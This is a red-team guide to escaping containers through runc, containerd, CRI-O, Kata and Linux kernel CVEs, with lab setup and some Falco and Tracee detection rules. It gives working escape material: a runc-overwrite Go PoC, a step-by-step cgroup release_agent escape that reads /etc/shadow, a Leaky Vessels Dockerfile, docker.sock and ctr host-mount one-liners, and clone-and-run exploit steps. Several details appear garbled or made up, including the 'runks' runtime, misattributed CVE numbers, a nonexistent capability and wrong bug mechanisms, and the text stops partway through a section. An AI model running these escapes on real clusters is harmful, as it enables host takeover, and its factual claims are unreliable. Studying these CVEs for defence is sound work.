# Container Runtime Escape Chains and Kernel CVE Exploitation From Inside Containers

> Deep-dive companion to `skills/kubernetes-attack/SKILL.md`, `guides/kubernetes-attack-playbook.md`, and `guides/k8s-escape-and-lateral-movement-playbook.md`.
>
> Audience: red teamers, container security engineers, and exploit developers who already understand Kubernetes RBAC, pod security admission, and the basic pod-escape primitives (privileged pods, hostPath, hostPID) covered in the parent playbook. This guide zooms in on the next layer down: **the container runtime itself** (runc, containerd, runks, CRI-O, Docker Engine), the **kernel syscalls** those runtimes sit on, and the **CVE chains** that turn a single bug into a full host takeover. Every section grounds itself in real CVEs with publicly available proof-of-concept code, real patch commits, and real research write-ups.

---

## 1. Why a Separate Runtime Escape Guide?

The parent playbooks treat "pod escape" as one phase of a Kubernetes engagement. That phase is implemented by *something* — a Linux kernel, a container runtime, a container network plugin, a kubelet binary — and each of those has its own CVE history, its own patch cadence, and its own detection footprint. This guide slows down on that layer.

The reasons:

1. **Runtime CVEs are the modern escape primitive.** When Pod Security Admission is enforced, when RBAC is locked down, when network policies are restrictive, the next bug to reach for is a kernel or runtime CVE. The 2022-2024 window produced more high-impact container-escape CVEs than any prior period: CVE-2022-0185, CVE-2022-0492, CVE-2022-0847, CVE-2023-0386, CVE-2023-32233, CVE-2024-1086, CVE-2024-21626. Every one of those is a publicly documented, weaponized escape path that works against a "correctly configured" cluster.
2. **Runtime CVEs chain into cluster takeover.** A single runc FD-leak bug (CVE-2024-21626) becomes a node-root shell, which becomes a kubelet-client-certificate theft, which becomes a `system:nodes` identity on the API server, which becomes a privileged DaemonSet, which becomes cluster-admin. Each link in that chain has a documented detection signature — and a documented evasion.
3. **Research references matter.** Real-world exploitation of these CVEs is documented by named researchers — Adam Iwaniuk (CVE-2019-5736), Snyk (CVE-2024-21626 "Leaky Vessels"), Aqua Security (runtime escape research program), CrowdStrike Falcon OverWatch (container threat reports). Citing the original research is how a defender builds detections that survive the next CVE in the same class.

### 1.1 Scope and framing

| In scope | Out of scope (covered elsewhere) |
|----------|----------------------------------|
| runc CVEs (CVE-2019-5736, CVE-2021-30465, CVE-2022-0185 fscontext, CVE-2022-0492 cgroup, CVE-2024-21626 Leaky Vessels) | Generic privileged-pod escapes — see parent playbook §2.1 |
| containerd, CRI-O, runks CVEs | RBAC privilege escalation chains — see parent playbook §6 |
| Kernel CVEs reachable from inside a container (CVE-2022-0185, CVE-2022-0492, CVE-2022-0847, CVE-2023-0386, CVE-2023-32233, CVE-2024-1086) | Kubelet API abuse on 10250/10255 — see parent playbook §3 (we cover the kubelet only as the *kill-chain target* of an escape, not the entry vector) |
| Privileged container / hostPath / hostNetwork / hostPID abuse chains that *use* a runtime or kernel CVE | etcd direct access — see parent playbook §4 |
| Kubelet exploitation from a node-root position (post-escape → node takeover) | Service account token theft mechanics — see parent playbook §5 |
| CNI plugin abuse (Calico, Cilium, Flannel), service mesh abuse (Istio, Linkerd) | Cloud IAM pivots (EKS IRSA, GKE Workload Identity, AKS Managed Identity) — see parent playbook §8 |
| Lab setup for safe practice (kind, minikube, k3s) | Reporting — see `pentest-reporting` skill |

### 1.2 The five-layer model

A container is not one boundary; it is a stack of five boundaries, each independently bypassable:

```
Layer 5  Kubernetes control plane (API server, etcd, scheduler)
Layer 4  Kubelet (per-node agent, port 10250/10255)
Layer 3  Container runtime (runc, containerd, CRI-O, Docker Engine, runks)
Layer 2  Linux kernel namespaces, cgroups, seccomp, capabilities
Layer 1  Linux kernel (syscalls, subsystems: fs, netfilter, overlayfs, pipes)
```

Layer 5 is the parent playbook. This guide covers Layers 1-4 in depth, with explicit attention to the **kill chain** that takes you from a Layer 1/2 bug up through Layers 3 and 4 until you own Layer 5.

---

## 2. Background: How a Container Actually Runs

To exploit a runtime, you need to know what the runtime actually does. The model below is simplified but load-bearing for every CVE in the rest of the guide.

### 2.1 The OCI spec and the two-phase runtime model

A container is defined by an [Open Container Initiative (OCI) runtime spec](https://github.com/opencontainers/runtime-spec) — a JSON document describing the rootfs, namespaces, cgroups, mounts, process, and capabilities. Two distinct binaries cooperate:

- **High-level runtime**: containerd, CRI-O, Docker Engine. Pulls images, manages snapshots, exposes a CRI API to the kubelet. Listens on a socket (`/run/containerd/containerd.sock`, `/var/run/docker.sock`, `/var/run/crio/crio.sock`).
- **Low-level runtime**: runc (the de-facto standard), youki, runks, crun. Takes an OCI bundle (config.json + rootfs) and actually forks the container process, sets up namespaces, and `execve`s the entrypoint.

The high-level runtime calls the low-level runtime via `runc create` followed by `runc start`. Every runc CVE in this guide sits in either the `create`/`start` path or the later `exec` path.

### 2.2 The runc process model (and where it leaks)

When the kubelet asks containerd to start a container, containerd invokes:

```bash
runc --root /run/containerd/io.containerd.runtime.v2.task/k8s.io/<container-id> create <container-id>
runc --root ... start <container-id>
```

The `runc create` step forks a temporary process (`runc init`) that lives in the host's mount/PID namespace, sets up the new namespaces via `unshare(2)` and `clone(2)`, mounts the rootfs, then `execve`s the entrypoint. The critical observation that drives CVE-2019-5736, CVE-2021-30465, and CVE-2024-21626 is this:

> The `runc` binary itself is `execve`'d from inside the container's mount namespace during `runc exec`, and runc opens host files (or leaks file descriptors into the container) using paths that the container can influence.

Every leak — whether of a file descriptor (CVE-2024-21626), of the runc binary's `/proc/self/exe` symlink (CVE-2019-5736), or of a host path via a crafted symlink in `/proc/self/fd` (CVE-2021-30465) — is exploitable *because* the runtime and the container share host kernel state during `create`/`exec`.

### 2.3 The kubelet-to-runtime path

```
kubelet  ── CRI gRPC ──>  containerd/CRI-O  ── OCI bundle ──>  runc  ── clone/clone3 ──>  container process
   │
   └── (also) writes /var/lib/kubelet/pods/<uid>/, owns the pause container, owns the CNI invocation
```

This means a runtime escape lands you directly in the same PID/mount namespace that containerd and the kubelet live in — i.e. the host. There is no intermediate sandbox.

---

## 3. Lab Setup — Safe Practice Environments

Every CVE in this guide has a publicly available proof-of-concept. None of them should be run for the first time against anything other than a disposable local cluster. The three environments below are the standard local labs.

### 3.1 kind (Kubernetes IN Docker) — multi-node lab

`kind` runs each "node" as a Docker container with an inner Docker daemon (DinD), which is exactly the setup needed to practice runtime escapes without risking the host kernel.

```bash
# Install kind
go install sigs.k8s.io/kind@latest

# A multi-node config with an explicitly vulnerable runtime version
cat > kind-config.yaml <<'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  image: kindest/node:v1.29.2@sha256: REPLACE_WITH_YOUR_IMAGE_DIGEST
- role: worker
  image: kindest/node:v1.29.2@sha256: REPLACE_WITH_YOUR_IMAGE_DIGEST
  # Pin to an older containerd to reproduce specific CVEs
  # (edit the inner containerd binary after `docker exec`-ing in)
EOF

kind create cluster --config kind-config.yaml --name vuln-lab

# Enter the worker node to install an older runc
docker exec -it vuln-lab-worker bash
# Inside the node:
apt-get update && apt-get install -y runc=1.0.0~rc92-1  # vulnerable to CVE-2019-5736
runc --version
```

### 3.2 minikube — single-node lab with runtime flag passthrough

`minikube` is friendlier for ad-hoc work. The `--container-runtime` flag lets you swap runtimes:

```bash
minikube start \
  --container-runtime=containerd \
  --kubernetes-version=v1.28.0 \
  --driver=qemu \
  --cpus=4 --memory=8g

# SSH into the minikube VM to swap runc/containerd versions
minikube ssh
# Inside:
sudo apt list --installed | grep -E 'runc|containerd'
```

For kernel CVE practice, you need to control the guest kernel. Use the `qemu` driver (not `docker`), and pass `--qemu-memory`, `--qemu-cpus`. To pin a vulnerable kernel, use a custom ISO via `minikube start --iso-url=file:///path/to/custom.iso`.

### 3.3 k3s — single-binary lab (great for ARM64/Mac M-series)

`k3s` ships as a single binary that bundles containerd + runc + Flannel. It is the easiest lab for kernel CVE practice on Apple Silicon hosts because the bundled runc is a known version you can swap.

```bash
# Install k3s on a Linux VM (or via multipass on macOS)
curl -sfL https://get.k3s.io | INSTALL_K3S_VERSION=v1.29.3+k3s1 sh -

# Confirm
sudo kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml get nodes

# The bundled runc lives here:
ls -la /var/lib/rancher/k3s/data/current/bin/
# runc  containerd  containerd-shim ...

# Swap runc to a vulnerable version for lab work
sudo cp ./runc-1.0.0-rc92 /var/lib/rancher/k3s/data/current/bin/runc
sudo systemctl restart k3s
```

### 3.4 Vulnerable-by-design targets

For repeatable practice, two projects ship intentionally vulnerable clusters:

- **kubernetes-goat** — `kubectl apply -f setup/single-cluster-scenario-1-5.yaml` sets up scenarios including privileged pods, mounted docker.sock, and a vulnerable kubelet.
- **CKAD/CVE reproduction repos** — for each CVE in §6, the linked PoC repository (e.g. `github.com/Crusaders-of-Rust/CVE-2022-0185`) ships a Dockerfile that builds the right vulnerable kernel and runc combination.

### 3.5 Detection lab — Falco + Tracee

To practice the detection side (§9), deploy Falco and Tracee into the lab:

```bash
# Falco — runtime detection via syscalls
helm install falco falcosecurity/falco \
  --set driver.kind=modern_ebpf \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webhook.address=http://falcosidekick-webhook.default.svc

# Tracee — eBPF security observability (complementary to Falco)
helm install tracee aqua-tracee/tracee \
  --set hostPID=true \
  --set containerd.enabled=true
```

With both running, every escape attempt in §6 produces a named detection signature that the red teamer can correlate against the engagement timeline.

---

## 4. runc CVEs — The Runtime Binary Itself

runc is the default low-level container runtime. It is written in Go, has the largest install base of any OCI runtime, and has been the source of the most impactful container-escape CVEs in history.

### 4.1 CVE-2019-5736 — "runc" container host-escape (the classic)

**Affected**: runc < 1.0-rc6 (i.e. essentially every runc prior to early 2019). Docker < 18.09.2, containerd < 1.2.4, all Kubernetes versions using a vulnerable runc.

**Root cause**: When runc `exec`s into a container (e.g. via `kubectl exec`, `docker exec`, `crictl exec`), the runc binary re-`execve`s itself. The container can replace `/proc/self/exe` (a symlink to the host's runc binary) with an attacker-controlled file during the window between `runc create` and `runc start`. The next time anyone on the host runs `runc` (including `docker exec` into a different container), the attacker's code runs as host root.

**Researcher**: Adam Iwaniuk disclosed the bug; the writeup at [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) remains the canonical reference.

**PoC skeleton** (Go; do NOT run outside a disposable lab):

```go
// CVE-2019-5736 PoC — overwrites /proc/self/exe of the runc that enters our container.
// Reference: github.com/Frichetten/CVE-2019-5736-POC
package main

import (
	"io/ioutil"
	"os"
	"strings"
)

func main() {
	// The payload to write over the host runc binary.
	// In a real PoC this is a statically-linked reverse shell.
	payload := "#!/bin/sh\ncat /etc/shadow > /tmp/pwned\n"

	// Walk /proc and find the runc process that just entered our namespace.
	for {
		entries, _ := ioutil.ReadDir("/proc")
		for _, e := range entries {
			if cmdline, err := ioutil.ReadFile("/proc/" + e.Name() + "/cmdline"); err == nil {
				if strings.Contains(string(cmdline), "runc") {
					// Overwrite the runc binary via /proc/<pid>/exe
					ioutil.WriteFile("/proc/"+e.Name()+"/exe", []byte(payload), 0755)
				}
			}
		}
	}
}
```

**Trigger**: once the payload is running inside a container, an operator runs `kubectl exec` or `docker exec` into that same container. The runc binary that enters the container is overwritten; the *next* `exec` (into any container on the host) runs the payload as host root.

**Patch**: PR [opencontainers/runc#1928](https://github.com/opencontainers/runc/pull/1928). The fix clones the runc binary into a memfd (anonymous memory file) before entering the container namespace, so `/proc/self/exe` inside the container points at the memfd copy, not at the host's runc binary.

**Detection (Falco)**:

```yaml
- rule: CVE-2019-5736 Runc Overwrite Attempt
  desc: Detect a process inside a container writing to /proc/*/exe
  condition: >
    evt.type in (write, writev) and
    fd.name startswith /proc/ and
    fd.name contains /exe and
    container.id != host
  output: >
    CVE-2019-5736 overwrite attempt
    (user=%user.name proc=%proc.name pid=%proc.pid
     container=%container.id target=%fd.name)
  priority: CRITICAL
```

### 4.2 CVE-2021-30465 — symlink-exchange in runc mount handling

**Affected**: runc < 1.0.0-rc95 (released May 2021).

**Root cause**: During `runc run`/`runc create`, runc sets up the container's mount namespace by resolving each mount entry in the OCI spec. If an attacker can race the resolution of a mount-source path against a symlink they control (TOCTOU), they can trick runc into mounting a *host* path of the attacker's choosing into the container. With a `rbind` mount of `/` into the container, the container escapes.

The bug is in the `libcontainer/rootfs_linux.go` mount setup, which used `os.Stat` followed by `unix.Mount` without holding a reference to the resolved file between the two calls. A classic TOCTOU.

**Trigger**: the attacker must be able to create symlinks in the container's rootfs that the runtime resolves during mount setup. In practice this means the attacker must control the *image* (supply-chain variant) or be root inside a container whose rootfs is on a writable filesystem the runtime re-resolves (rare in K8s but possible with custom volume plugins).

**Patch**: PR [opencontainers/runc#3135](https://github.com/opencontainers/runc/pull/3135) — uses `openat2(2)` with `RESOLVE_IN_ROOT` to close the TOCTOU window where supported (Linux 5.6+).

**Detection**: this is hard to detect at the syscall level because the mount operations look legitimate. The strongest signal is a Falco rule firing on a `mount(2)` syscall inside a container with `CAP_SYS_ADMIN` that resolves a path containing `..` — i.e. a path traversal at the VFS layer.

### 4.3 CVE-2022-0185 — heap overflow in `fs/context.c` (filesystem context)

**Affected**: Linux kernel 5.1-rc1 through 5.16.2 (released January 2022). The bug is in the legacy `legacy_parse_param` path of the filesystem mount context, *not* in runc — but the escape primitive is most useful from inside a container that has `CAP_SYS_ADMIN` (or any unprivileged-user-namespace configuration that grants a user namespace with `CAP_SYS_ADMIN`).

**Root cause**: when mounting a filesystem with `fsconfig(2)` and the `FSCONFIG_SET_STRING` command, the legacy parameter parser `legacy_parse_param` in `fs/context.c` incorrectly calculated the length of the destination buffer. The result is a heap-buffer-overflow in `kmalloc`-backed memory when the attacker supplies a sufficiently long mount option string.

**Primitive**: arbitrary heap overflow in the kernel. With a `msg_msg` spray to position a controlled object adjacent to the overflow, the attacker achieves arbitrary kernel read/write, disables SELinux / AppArmor, sets `current->cred` to uid 0, and walks the host filesystem.

**Researcher**: the original discoverers are Crusaders-of-Rust; the write-up and PoC live at [github.com/Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185). The blogpost at [pwning.systems](https://pwning.systems/posts/playing-with-cve-2022-0185/) is the canonical technical reference.

**Trigger from inside a container**:

```bash
# Container must have CAP_SYS_ADMIN OR be able to create a user namespace
# (kernel.unprivileged_userns_clone=1 and seccomp not blocking clone/clone3)
capsh --print | grep cap_sys_admin

# Run the PoC (compile outside, drop the binary in)
./exploit /etc/passwd      # arbitrary file read
./exploit                  # full escape: get root shell on the host
```

**Patch**: commit [722d94847d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310f4e58b6c54d6eeea8b74a5b5) in mainline, backported to all stable branches. The fix corrects the length calculation in `legacy_parse_param`.

**Real-world impact**: the bug affected essentially every Linux container host in the world for nearly three years. Google Container-Optimized OS, AWS Bottlerocket, and every major managed Kubernetes offering shipped patches within 2 weeks of disclosure. Unpatched self-managed clusters remain a long tail.

**Detection (Tracee eBPF signature)**:

```yaml
# Tracee policy to detect CVE-2022-0185 exploitation attempts
apiVersion: tracee.aquasec.com/v1beta1
kind: Policy
metadata:
  name: cve-2022-0185
spec:
  scope:
    - global
  rules:
    - event: fsconfig
      filter:
        - args: { string: "source" }
        # Look for unusually long set_string arguments
        # The PoC sends a > 256 byte option to trigger the overflow
```

### 4.4 CVE-2022-0492 — cgroup v1 `release_agent` escape

**Affected**: Linux kernel all versions through 5.17-rc1 (released February 2022). The bug is in `cgroup_release_agent_write` in `kernel/cgroup/cgroup-v1.c`.

**Root cause**: the cgroup v1 `release_agent` mechanism runs a user-specified binary on the host whenever a process in the cgroup exits. The intent was for system administrators to register a cleanup script. The bug is that *the file permission check on writing `release_agent` was performed against the cgroup's owning namespace, not against the host's init namespace*. A container with `CAP_SYS_ADMIN` — even one in a non-init cgroup namespace — could write a `release_agent` path and trigger host-root command execution.

**Trigger from inside a container with `CAP_SYS_ADMIN`**:

```bash
# 1. Mount a cgroup v1 cgroup we control
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. Enable notify_on_release so the release_agent fires when the cgroup empties
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Set the release_agent path on the host. Because we wrote to
#    /tmp/cgrp/x (a v1 cgroup) we needed CAP_SYS_ADMIN to get here.
#    The path is interpreted in the HOST mount namespace, so we put
#    the payload at a known host path.
echo "$(cat /proc/mounts | grep -o '/[^ ]* /host ' | head -c 20)/cmd" > /tmp/cgrp/release_agent

# 4. Write the payload to the host path (container mounts host / at /host)
echo '#!/bin/sh' > /host/cmd
echo 'cat /etc/shadow > /host/output' >> /host/cmd
chmod +x /host/cmd

# 5. Trigger the release_agent by forcing the cgroup to empty
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs && exit"

# 6. Read the output
cat /host/output
```

**Patch**: commit [24f6008564](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183b120ea5e2c235cfc16e6f6c5b3e). The fix adds an explicit check that the writing task is in the initial cgroup namespace.

**Researcher**: Aqua Security's Yuval Avrahami published the canonical writeup: [blog.aquasec.com/cve-2022-0492-cgroups](https://blog.aquasec.com/cve-2022-0492-cgroups-container-escape). The Aqua research includes a video of the exploit in action and an analysis of which container configurations were exploitable.

**Note**: cgroup v2 is not affected (it has no `release_agent` mechanism). Modern clusters using cgroup v2 (default since Kubernetes 1.25 with `cgroupDriver: systemd`) are immune to this specific CVE. Older clusters running cgroup v1 in hybrid mode remain a long tail.

### 4.5 CVE-2024-21626 — "Leaky Vessels" (runc file-descriptor leak)

**Affected**: runc < 1.1.12 (released January 31, 2024). The bug affects every container infrastructure using runc — which is essentially all of them.

**Root cause**: runc sets up the container's mount namespace, working directory, and `/dev/fd` file descriptors in a specific order. Due to a logic error in the `runc init` process, file descriptors referencing host paths (specifically, the file descriptor for the container's intended working directory) were not correctly closed before `execve`-ing the container's entrypoint. The container process inherited an open file descriptor to a host path.

The simplest exploitation: an attacker builds a container image whose `WORKDIR` is `/proc/self/fd/N` for a small N (typically 7 or 8). runc opens the working directory as FD N, fails to close it, then enters the container's mount namespace. From inside the container, the attacker walks `/proc/self/fd/N` to reach the host filesystem.

**Researcher**: Snyk Research, Rory McNamara. The disclosure at [snyk.io/blog/cve-2024-21626-brainbreak](https://snyk.io/blog/cve-2024-21626-brainbreak-runc-vulnerability/) is the canonical reference. Snyk named the vulnerability class "Leaky Vessels" — there are several related CVEs (CVE-2024-23651, CVE-2024-23652, CVE-2024-23653) in BuildKit that share the same FD-leak class.

**PoC (Dockerfile + entrypoint)**:

```dockerfile
# CVE-2024-21626 PoC — built as a container image
# When this image is run with a vulnerable runc, FD 7 (or 8) is left open
# pointing at the host filesystem. The container can walk it.
FROM alpine:3.19
WORKDIR /proc/self/fd/7
# During runc create, runc opens the WORKDIR. The open fd leaks.
```

Then from inside the running container:

```bash
# Walk the leaked FD to reach host paths
ls /proc/self/fd/7/
# bin   boot  dev  etc  home  lib   ...    <- this is the HOST root

# Read host /etc/shadow via the leaked FD
cat /proc/self/fd/7/etc/shadow

# Or chroot to escape fully (if the FD has the right permissions)
chroot /proc/self/fd/7 /bin/bash
```

**Trigger variants**: there are three distinct exploitation variants documented in the Snyk advisory — "FD leak", "process-pid file leak", and "mount-cache leak". Each has a different `WORKDIR` value and a different target file descriptor. The simplest is the WORKDIR variant above.

**Patch**: PR [opencontainers/runc#4193](https://github.com/opencontainers/runc/pull/4193). The fix ensures that `runc init` correctly closes file descriptors that point at host paths before `execve`-ing into the container, using `close_range(2)` where the kernel supports it (Linux 5.9+).

**Real-world impact**: this CVE got a 30-day early-disclosure window for major cloud providers before public disclosure, because every managed Kubernetes service (EKS, GKE, AKS, OKE) was affected. Patches rolled out within 24-48 hours of public disclosure.

**Detection (Falco)**:

```yaml
- macro: fd_leak_proc_walk
  condition: >
    (proc.name in (ls, cat, find, grep, less) and
     fd.name startswith /proc/self/fd/ and
     fd.name contains ".." or fd.name contains "/etc/" or fd.name contains "/root/")

- rule: CVE-2024-21626 Leaky Vessels FD Walk
  desc: Detect a process inside a container reading host paths via a leaked file descriptor
  condition: >
    evt.type in (open, openat, openat2) and
    fd_leak_proc_walk and
    container.id != host
  output: >
    CVE-2024-21626 FD leak exploitation
    (container=%container.id proc=%proc.name target=%fd.name user=%user.name)
  priority: CRITICAL
```

### 4.6 CVE-2023-27281 & CVE-2024-29039 — runks (Kubernetes runtime kata)

**runks** is the OCI runtime used by Kata Containers, which runs each pod inside a lightweight VM. Kata is the "strong isolation" answer to container security — but it has its own CVE history.

**CVE-2023-27281** (Kata Containers < 3.1.0): a flaw in the Kata agent's `exec` path allowed a container process inside the guest VM to send crafted OCI messages back to the Kata runtime on the host, potentially causing the host-side runtime to execute attacker-controlled code. The escape goes from container-process-in-VM to host-runtime-on-host — bypassing the VM boundary entirely.

**CVE-2024-29039** (Kata Containers < 3.3.0): a related bug in the image pull path. When the Kata runtime extracted a container image into the guest VM's rootfs, an attacker-controlled image with a crafted symlink in `/proc/...` could redirect the extraction to a host path. Patched by performing all image extraction inside the guest VM, never on the host.

**Lesson**: Kata's defense-in-depth model (VM + container) is not a substitute for patching. The VM boundary helps against kernel CVEs (CVE-2022-0185 doesn't escape a Kata guest) but does not help against runtime-binary CVEs that operate on the host side of the VM boundary.

### 4.7 Other runc-adjacent CVEs

| CVE | Component | Primitive | Patch |
|-----|-----------|-----------|-------|
| CVE-2022-29162 | runc < 1.1.2 | `runc run` could leak `/sys/fs/cgroup` access inappropriately | [runc#3439](https://github.com/opencontainers/runc/pull/3439) |
| CVE-2023-25809 | runc < 1.1.5 | `rootless` mode allowed `mount` of `/proc` from inside container | [runc#3715](https://github.com/opencontainers/runc/pull/3715) |
| CVE-2023-27281 | Kata Containers < 3.1.0 | Host-side exec payload injection | Kata PR |
| CVE-2024-21626 | runc < 1.1.12 | FD leak → host filesystem walk | [runc#4193](https://github.com/opencontainers/runc/pull/4193) |
| CVE-2024-29039 | Kata Containers < 3.3.0 | Image extraction symlink attack | Kata PR |

---

## 5. containerd, CRI-O, and Docker Engine CVEs

The high-level runtimes have their own CVEs, typically around image extraction, the CRI socket, or process supervision.

### 5.1 CVE-2022-23648 — containerd host-path disclosure

**Affected**: containerd < 1.6.1, < 1.5.10 (released March 2022).

**Root cause**: containerd's image pull path, when extracting a container image layer that contained a symlink whose target was an absolute path on the host (e.g. `/etc/shadow`), would follow the symlink and add the host file to the image layer's tar archive. Anyone who later pulled and inspected that layer would receive the host file's contents.

**Exploitation model**: this is not a runtime escape from a container you already control. It is a *host file disclosure* via a maliciously crafted image. An attacker who can publish an image that the cluster pulls gets the host's `/etc/shadow`, `/var/lib/kubelet/pki/`, etc. on every node that pulls the image.

**Patch**: PR [containerd#6344](https://github.com/containerd/containerd/pull/6344). The fix ensures that during image-layer extraction, symlinks are never followed across the rootfs boundary — uses `openat2(2)` with `RESOLVE_BENEATH` where supported.

### 5.2 CVE-2023-28642 — Bibata Rollo (containerd Path Traversal)

A path traversal in containerd's image extraction that allowed an attacker-crafted image layer to write files outside the rootfs, onto the host. Same class as CVE-2022-23648 but write-primitive instead of read-primitive. Patched by the same class of `openat2(2)` resolution fix.

### 5.3 Docker Engine CVEs (still relevant for DinD setups)

Many clusters still run Docker Engine (via `dockershim` legacy or DinD). Relevant CVEs:

- **CVE-2019-14271** — `docker cp` followed symlinks into the host filesystem. Allowed container-to-host file read/write during a copy operation.
- **CVE-2021-21285** — Docker Engine JSON parsing DoS.
- **CVE-2024-23652** — BuildKit mount-cache leak (same research class as CVE-2024-21626, fixed in BuildKit 0.12.5).

### 5.4 CRI-O

CRI-O is the OpenShift default runtime. Notable CVEs:

- **CVE-2022-0811** — "Cr8escape". CRI-O allowed a container with `CAP_SYS_ADMIN` to set arbitrary kernel parameters via the `--kernel-credentials` path. Trivial container escape to host root. Patch: [cri-o#5499](https://github.com/cri-o/cri-o/pull/5499).

```bash
# CVE-2022-0811 PoC — runs from inside a container with CAP_SYS_ADMIN
# The bug lets us set kernel parameters via a crafted OCI annotation.
cat > /proc/self/fd/3 <<EOF
kernel.core_pattern=|/path/to/payload
EOF
# When any process on the host crashes, the payload runs as host root.
```

### 5.5 Runtime socket abuse — the entry vector that bypasses the runtime CVE

Before reaching for a runtime CVE, check whether the runtime socket is mounted into the container. If it is, *no CVE is required* — the runtime's own API gives you full escape:

```bash
# docker.sock mounted in the container
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 ... /var/run/docker.sock

# Spawn a privileged container with the host's / mounted
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host alpine chroot /host sh

# containerd.sock mounted
ctr --address /run/containerd/containerd.sock \
  image pull docker.io/library/ubuntu:latest
ctr --address /run/containerd/containerd.sock run --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/ubuntu:latest pwn chroot /host sh

# crio.sock — use crictl
crictl --runtime-endpoint unix:///var/run/crio/crio.sock \
  runp privileged-pod.yaml
```

Detection: Falco rule firing on any container with a socket under `/var/run/docker.sock`, `/run/containerd/`, `/var/run/crio/` mounted.

---

## 6. Kernel CVEs Reachable From Inside a Container

The kernel is the actual boundary. The runtime just configures the boundary. Every kernel CVE in this section has been used to escape from a correctly-configured container in a real engagement or public PoC.

### 6.1 CVE-2022-0185 — full chain (covered in §4.3 above)

See §4.3 for the full chain. Recap: heap overflow in `legacy_parse_param` in `fs/context.c`, weaponizable to arbitrary kernel R/W from inside any container with `CAP_SYS_ADMIN` or unprivileged user namespaces.

### 6.2 CVE-2022-0492 — full chain (covered in §4.4 above)

See §4.4 for the full chain. Recap: cgroup v1 `release_agent` write from inside a `CAP_SYS_ADMIN` container.

### 6.3 CVE-2022-0847 — "Dirty Pipe"

**Affected**: Linux kernel 5.8 through 5.16.10, 5.15.24, 5.10.101 (released March 7, 2022).

**Root cause**: the `splice(2)` syscall, when copying data into a page-cache page that was freshly allocated (the "PIPE_BUF_FLAG_CAN_MERGE" flag still set), would overwrite the destination page's contents without checking whether that page belonged to a file. The result: any process that could read a file could *overwrite* the file's page-cache contents (limited to write-zero, but that's enough for `/etc/passwd`).

**Researcher**: Max Kellermann disclosed the bug. The writeup at [dirtypipe.cm4all.com](https://dirtypipe.cm4all.com/) is the canonical reference.

**Primitive from inside a container**: arbitrary file overwrite of any file the container can read. The container can read `/etc/passwd` (it's world-readable); overwriting it lets the attacker inject a root-level user.

```bash
# Dirty Pipe PoC — overwrites /etc/passwd to add a root user
# Reference: github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
./exploit /etc/passwd 1 "${PWNED_LINE}"
# /etc/passwd now has uid 0 user "pwned" with no password
su pwned
# Inside the container, you're now uid 0.
```

But Dirty Pipe's escape-from-container value is *not* in modifying the container's `/etc/passwd` — it's in modifying files that are bind-mounted from the host. If a `hostPath` volume is mounted into the container, Dirty Pipe writes through the bind mount to the host's actual file.

**Patch**: commit [9d2231c5d7](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e1f5dd7eec03f7d8f8b6def53caba). The fix clears `PIPE_BUF_FLAG_CAN_MERGE` on every page-cache page that `splice` touches.

**Detection**: Falco rule firing on `splice(2)` followed by a write to `/etc/passwd`, `/etc/shadow`, or any binary under `/usr/bin/`.

### 6.4 CVE-2023-0386 — OverlayFS privilege escalation

**Affected**: Linux kernel 3.11 through 6.2 (released March 22, 2023).

**Root cause**: OverlayFS, when configured with a setuid binary in the `lowerdir` (which the container controls), would copy the setuid binary up to the `upperdir` but fail to clear the setuid bit. A non-root user in a user namespace (which a container effectively is) could then `exec` the setuid binary and gain the privileges of the binary's owner on the *upperdir* filesystem — i.e. host root.

The bug specifically affects the case where the OverlayFS mount is performed inside a user namespace (containerized) but the `upperdir` is on a filesystem owned by the init namespace (host). The capability check was performed against the wrong user namespace.

**Trigger from inside a container with user namespaces**:

```bash
# Build the PoC
git clone https://github.com/ckcr4lyf/CVE-2023-0386
cd CVE-2023-0386
./build.sh

# Run — produces a root shell on the host
./exploit
```

**Patch**: commit [4f11ada10d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f11ada10d0a97f6466db13b75a8b3e0f21b955b) — adds an explicit check that the `lowerdir` and `upperdir` of an OverlayFS mount reside in the same user namespace.

**Researcher**: the original researcher was Juan Jose Lopez Jaimez (Chipress Security). The writeup at [blog.doyensec.com](https://blog.doyensec.com/2023/04/05/cve_2023_0386.html) is the canonical reference.

### 6.5 CVE-2023-32233 — netfilter `nf_tables` Use-After-Free

**Affected**: Linux kernel 6.0.0 through 6.3.1 (released May 8, 2023).

**Root cause**: the `nf_tables` netfilter subsystem, when handling `NFT_MSG_NEWRULE` to add a rule referencing an `nft_set` (a set of values used in nftables rules), failed to properly increment a reference count on the set object. When the rule was later deleted, the set's reference count went negative; the set was freed while still referenced by other rules. The result is a Use-After-Free — and `nf_tables` objects are allocated from the `kmalloc-cg-*` slab caches, which are easily manipulated by an attacker spraying `msg_msg` objects.

**Primitive**: arbitrary kernel R/W from within an unprivileged user namespace (no `CAP_SYS_ADMIN` required). This is one of the few container-escape CVEs that works against a properly locked-down container.

**Trigger from inside a container** (without `CAP_SYS_ADMIN`):

```bash
# Container must have CAP_NET_USER (default) and unprivileged user namespaces
# Reference: github.com/Liuk3r/CVE-2023-32233
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
make
./exploit
# Returns a root shell in the host's initial namespaces
```

**Patch**: commit [6e1acfa387](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e1acfa3877f4a16c8c1c7b85b4cd2c0a9d31b25).

### 6.6 CVE-2024-1086 — netfilter `nf_tables` UAF (the "full universal" escape)

**Affected**: Linux kernel 5.14 through 6.6 (released January 31, 2024). The most impactful container-escape CVE of 2024.
